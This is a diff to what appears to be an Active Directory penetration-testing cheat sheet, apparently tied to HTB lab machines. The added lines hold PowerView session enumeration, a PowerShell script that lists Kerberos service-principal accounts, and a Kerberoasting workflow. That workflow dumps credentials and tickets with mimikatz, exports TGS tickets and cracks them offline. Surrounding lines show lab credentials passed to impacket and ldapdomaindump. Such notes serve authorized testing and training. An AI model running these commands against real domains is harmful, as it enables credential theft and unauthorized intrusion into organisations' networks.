@@ -174,6 +174,11 @@ mitm6 -d yuncorp.local
 ```Shell
 crackmapexec smb 192.168.100.0/24 
 ```
+```Shell
+Import-Module .\PowerView.ps1
+Get-NetLoggedon -ComputerName pc-user
+Get-NetSession -ComputerName dc01
+```
 
 ### Enumerate
 ```Shell
@@ -187,12 +192,49 @@ kerbrute userenum --domain htb.local /opt/SecLists/Usernames/xato-net-10-million
 ```Shell
 ldapdomaindump -u "htb\James" -p "J@m3s_P@ssW0rd\!" 10.10.10.52 
 ```
+```console
+# Enumerate SPNs
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$PDC = ($domainObj.PdcRoleOwner).Name
+$SearchString = "LDAP://"
+$SearchString += $PDC + "/"
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+$SearchString += $DistinguishedName
+$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+$objDomain = New-Object System.DirectoryServices.DirectoryEntry
+$Searcher.SearchRoot = $objDomain
+$Searcher.filter="serviceprincipalname=*"
+$Result = $Searcher.FindAll()
+Foreach($obj in $Result)
+{
+Foreach($prop in $obj.Properties)
+{
+$prop
+}
+}
+```
 
 ### Kerberoasting
 1.- Dump in memory
 2.- Request TGS
 
 impacket-GetNPUsers 'htb.local/james:J@m3s_P@ssW0rd!' -dc-ip 10.10.10.52 # Dump the full list of ASP-REP vulnerable users
+
+#### Dump in memory
+
+```Shell
+mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+sekurlsa::tickets
+```
+```console
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
+klist
+kerberos::list /export
+python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-USER@HTTP~Corp.corp.com-CORP.COM.kirbi
+```
 
 #### Request TGS
 ```Shell
